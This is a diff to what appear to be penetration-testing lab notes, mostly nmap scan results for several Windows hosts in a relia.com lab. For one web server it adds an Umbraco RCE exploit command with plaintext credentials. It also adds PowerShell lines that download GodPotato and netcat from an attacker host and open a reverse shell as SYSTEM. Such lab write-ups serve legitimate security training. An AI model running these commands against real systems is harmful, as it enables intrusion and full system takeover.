@@ -145,7 +145,7 @@ PORT    STATE SERVICE  VERSION
 ```
 
 # VM 12 .247
-- WEB02
+- WEB02 (Standalone machine | No Internal Access)
 ```
 PORT    STATE SERVICE  VERSION
 80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
@@ -206,5 +206,144 @@ Host script results:
 |_    Message signing enabled but not required
 | smb2-time: 
 |   date: 2024-08-06T13:56:55
+|_  start_date: N/A
+```
+
+## Interesting info
+1. Umbraco 7?
+2. ASP.NET 4.5 or 4.5.1
+3. SQL CE, SQL Server 2008
+
+## Foothold
+    ```
+    https://github.com/Jonoans/Umbraco-RCE
+    python exploit.py -u mark@relia.com -p OathDeeplyReprieve91 -w http://web02.relia.com:14080 -i 192.168.45.200
+    ```
+
+## Root
+- Net4.0 & seimpersante permission = enabled
+```
+    iwr -uri http://192.168.45.200/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
+   
+   iwr -uri http://192.168.45.200/nc64.exe -Outfile nc64.exe
+   
+    .\GodPotato-NET4.exe -cmd "C:\temp\nc64.exe 192.168.45.200 8000 -e cmd.exe" 
+```
+
+# VM 13 .248
+```
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Home
+| http-robots.txt: 16 disallowed entries (15 shown)
+| /*/ctl/ /admin/ /App_Browsers/ /App_Code/ /App_Data/ 
+| /App_GlobalResources/ /bin/ /Components/ /Config/ /contest/ /controls/ 
+|_/Documentation/ /HttpModules/ /Install/ /Providers/
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: EXTERNAL
+|   NetBIOS_Domain_Name: EXTERNAL
+|   NetBIOS_Computer_Name: EXTERNAL
+|   DNS_Domain_Name: EXTERNAL
+|   DNS_Computer_Name: EXTERNAL
+|   Product_Version: 10.0.20348
+|_  System_Time: 2024-08-06T13:56:44+00:00
+|_ssl-date: 2024-08-06T13:57:06+00:00; -2s from scanner time.
+| ssl-cert: Subject: commonName=EXTERNAL
+| Not valid before: 2024-03-29T20:11:03
+|_Not valid after:  2024-09-28T20:11:03
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49965/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-03-30T20:11:08
+|_Not valid after:  2054-03-30T20:11:08
+| ms-sql-ntlm-info: 
+|   192.168.220.248:49965: 
+|     Target_Name: EXTERNAL
+|     NetBIOS_Domain_Name: EXTERNAL
+|     NetBIOS_Computer_Name: EXTERNAL
+|     DNS_Domain_Name: EXTERNAL
+|     DNS_Computer_Name: EXTERNAL
+|_    Product_Version: 10.0.20348
+|_ssl-date: 2024-08-06T13:57:07+00:00; -1s from scanner time.
+| ms-sql-info: 
+|   192.168.220.248:49965: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 49965
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+| smb2-time: 
+|   date: 2024-08-06T13:56:49
+|_  start_date: N/A
+```
+
+# VM 14 .249
+```
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2024-08-06T13:57:06+00:00; -2s from scanner time.
+| ssl-cert: Subject: commonName=LEGACY
+| Not valid before: 2024-03-29T19:20:08
+|_Not valid after:  2024-09-28T19:20:08
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8000/tcp  open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
+| http-title: Welcome to XAMPP
+|_Requested resource was http://192.168.220.249:8000/dashboard/
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: -1s, deviation: 0s, median: -2s
+| smb2-time: 
+|   date: 2024-08-06T13:56:45
 |_  start_date: N/A
 ```
